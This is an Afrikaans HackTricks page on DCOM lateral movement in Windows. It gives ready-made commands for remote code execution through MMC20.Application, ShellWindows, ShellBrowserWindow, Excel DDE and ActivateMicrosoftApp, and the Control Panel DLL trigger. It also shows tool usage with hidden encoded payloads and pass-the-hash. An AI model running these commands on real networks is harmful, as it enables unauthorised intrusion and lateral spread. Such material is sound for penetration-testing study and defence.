# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM laterale beweging is aantreklik omdat dit bestaande COM servers hergebruik wat oor RPC/DCOM blootgestel word, in plaas daarvan om 'n diens of geskeduleerde taak te skep. In praktyk beteken dit dat die aanvanklike verbinding gewoonlik op TCP/135 begin en dan na dinamies toegewysde hoë RPC-poorte beweeg.

## Voorvereistes & Slaggate

- Jy benodig gewoonlik 'n plaaslike administrateur-konteks op die teiken, en die afgeleë COM server moet afgeleë bekendstelling/aktivering toelaat.
- Sedert **14 Maart 2023** dwing Microsoft DCOM-hardening vir ondersteunde stelsels af. Ouer clients wat 'n lae aktiveringsverifikasievlak aanvra, kan misluk tensy hulle ten minste `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` onderhandel. Moderne Windows clients word gewoonlik outomaties verhoog, dus werk huidige tooling normaalweg steeds.<sup>[[3]](#references)</sup>
- Handmatige of geskripteerde DCOM-uitvoering benodig gewoonlik TCP/135 plus die teiken se dinamiese RPC-poortreeks. As jy Impacket se `dcomexec.py` gebruik en jy wil opdraguitset terugkry, benodig jy gewoonlik ook SMB-toegang tot `ADMIN$` (of 'n ander skryfbare/leesbare share).
- As RPC/DCOM werk maar SMB geblokkeer word, kan `dcomexec.py -nooutput` steeds nuttig wees vir blinde uitvoering.

Vinnige kontroles:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Vir meer inligting oor hierdie tegniek, kyk na die [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM)-objekte bied interessante vermoëns vir netwerkgebaseerde interaksies met objekte. Microsoft verskaf omvattende dokumentasie vir beide DCOM en Component Object Model (COM), wat [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) beskikbaar is. ’n Lys van DCOM-toepassings kan met die PowerShell-opdrag verkry word:
```bash
Get-CimInstance Win32_DCOMApplication
```
Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak scripting van MMC snap-in-bewerkings moontlik. Hierdie object bevat veral 'n `ExecuteShellCommand`-method onder `Document.ActiveView`. Meer inligting oor hierdie method is [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) beskikbaar. Toets dit deur dit te laat loop:<sup>[[6]](#references)</sup>

Hierdie funksie fasiliteer die uitvoering van commands oor 'n network deur middel van 'n DCOM application. Om as 'n admin op afstand met DCOM te kommunikeer, kan PowerShell soos volg gebruik word:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Hierdie command koppel aan die DCOM application en gee ’n instance van die COM object terug. Die ExecuteShellCommand method kan dan invoked word om ’n process op die remote host uit te voer. Die process behels die volgende stappe:

Kontroleer metodes:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Verkry RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Die laaste argument is die vensterstyl. `7` hou die venster geminimaliseer. Operasioneel lei MMC-gebaseerde uitvoering gewoonlik daartoe dat ’n afgeleë `mmc.exe`-proses jou payload voortbring, wat verskil van die Explorer-gesteunde objects hieronder.

## ShellWindows & ShellBrowserWindow

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike plasing [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Daar is vasgestel dat die **MMC20.Application** object nie eksplisiete "LaunchPermissions" het nie en terugval op permissions wat Administrators toegang verleen. Vir verdere besonderhede kan ’n draad [hier](https://twitter.com/tiraniddo/status/817532039771525120) nagegaan word, en dit word aanbeveel om [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET te gebruik om objects sonder eksplisiete Launch Permission te filter.

Twee spesifieke objects, `ShellBrowserWindow` en `ShellWindows`, is uitgelig weens hul gebrek aan eksplisiete Launch Permissions. Die afwesigheid van ’n `LaunchPermission`-registerinskrywing onder `HKCR:\AppID\{guid}` dui op geen eksplisiete permissions nie.

In vergelyking met `MMC20.Application` is hierdie objects dikwels stiller vanuit ’n OPSEC-perspektief, omdat die command gewoonlik as ’n child van `explorer.exe` op die afgeleë host eindig, in plaas van `mmc.exe`.

### ShellWindows

Vir `ShellWindows`, wat nie ’n ProgID het nie, maak die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` object-instansiasie met behulp van sy AppID moontlik. Hierdie proses gebruik OleView .NET om die CLSID vir `ShellWindows` te verkry. Sodra dit geïnstantieer is, is interaksie moontlik deur die `WindowsShell.Item`-metode, wat lei tot metode-aanroeping soos `Document.Application.ShellExecute`.

Voorbeeld- PowerShell-commands is verskaf om die object te instansieer en commands op afstand uit te voer:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` is soortgelyk, maar jy kan dit direk via sy CLSID instansieer en na `Document.Application.ShellExecute` pivot:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Laterale beweging met Excel DCOM Objects

Laterale beweging kan bereik word deur DCOM Excel Objects te misbruik. Vir gedetailleerde inligting word dit aanbeveel om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.<sup>[[5]](#references)</sup>

Die Empire-projek verskaf ’n PowerShell-script wat die gebruik van Excel vir remote code execution (RCE) demonstreer deur DCOM Objects te manipuleer. Hieronder is brokkies uit die script wat op [Empire se GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) beskikbaar is en verskillende metodes toon om Excel vir RCE te misbruik:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Onlangse navorsing het hierdie gebied uitgebrei met `Excel.Application` se `ActivateMicrosoftApp()`-metode. Die kernidee is dat Excel kan probeer om legacy Microsoft-toepassings soos FoxPro, Schedule Plus of Project te begin deur die stelsel se `PATH` te soek. As ’n operateur ’n payload met een van daardie verwagte name op ’n skryfbare plek kan plaas wat deel van die teiken se `PATH` is, sal Excel dit uitvoer.<sup>[[4]](#references)</sup>

Vereistes vir hierdie variasie:

- Plaaslike admin op die teiken
- Excel geïnstalleer op die teiken
- Vermoë om ’n payload na ’n skryfbare gids in die teiken se `PATH` te skryf

Praktiese voorbeeld wat die FoxPro-opsoek (`FOXPROW.exe`) misbruik:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
As die aanvallende gasheer nie die plaaslike `Excel.Application` ProgID geregistreer het nie, instansieer eerder die afgeleë objek volgens CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Waardes wat in die praktyk gesien is en misbruik word:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — laai van 'n geregistreerde Control Panel DLL

Die `COpenControlPanel`-klas (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) stel `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) beskikbaar. Sy `Open()`-metode veroorsaak dat Control Panel DLLs wat onder die `Control Panel\Cpls`-sleutel geregistreer is, deur 'n afgeleë `dllhost.exe` gelaai word. Die klas het op getoetste stelsels geen eksplisiete launch/access permissions nie, en erf dus die verstek-DCOM-beleid (wat normaalweg 'n administrateur vir remote activation vereis). 'n Ewekansige itemnaam is genoeg om `Open()` die geregistreerde DLLs te laat verwerk; die payload hoef nie 'n `.cpl`-uitbreiding te hê nie, hoewel dit 'n geldige DLL van die korrekte architecture moet wees.<sup>[[7]](#references)</sup>

Hierdie primitive is **stage-and-trigger**, nie command-only execution nie: kopieer eers 'n DLL na die target en skep 'n `REG_EXPAND_SZ`-waarde wat daarna verwys, en aktiveer dan die object oor DCOM. Byvoorbeeld, vanuit 'n administratiewe Windows-konteks:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Die publieke [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)-kliënt implementeer die ongedokumenteerde DCOM-oproep met Impacket. Die verskaffing van 'n arbitrêre Control Panel-itemnaam is voldoende; die kliënt kan 'n RPC-fout rapporteer selfs al het `dllhost.exe` die DLL gelaai.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Operasioneel benodig hierdie pad ook ’n lêerskryf-kanaal en toegang tot die remote registry, dus is dit meer raserig as `MMC20`/`ShellWindows`. Dit skep ’n volhardingsnewe-effek omdat die opening van Control Panel later dieselfde inskrywing weer kan laai. Verwyder die waarde ná uitvoering en soek na onverwagte `Control Panel\Cpls`-waardes saam met ongewone DLL-ladings in `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Outomatiseringsnutsmiddels vir Lateral Movement

Twee nutsmiddels word uitgelig om hierdie tegnieke te outomatiseer:

- **Invoke-DCOM.ps1**: ’n PowerShell-script wat deur die Empire-projek verskaf word en die aanroeping van verskillende metodes om code op afgeleë masjiene uit te voer, vereenvoudig. Hierdie script is in die Empire GitHub-repository beskikbaar.

- **SharpLateral**: ’n nutsmiddel wat ontwerp is om code op afstand uit te voer en met die volgende command gebruik kan word:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Outomatiese Tools

- Die Powershell-script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) laat jou toe om maklik al die gekommentarieerde maniere om code op ander masjiene uit te voer, aan te roep.
- Jy kan Impacket se `dcomexec.py` gebruik om commands op remote systems met DCOM uit te voer. Huidige builds ondersteun `ShellWindows`, `ShellBrowserWindow` en `MMC20`, en gebruik by verstek `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Jy kan ook [**SharpMove**](https://github.com/0xthirteen/SharpMove) gebruik
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement met die MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Ronde 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [Bestuur veranderinge vir Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Misbruik die krag van DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Benut Excel DDE vir lateral movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Gebruik DCOM objects vir remote command execution](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
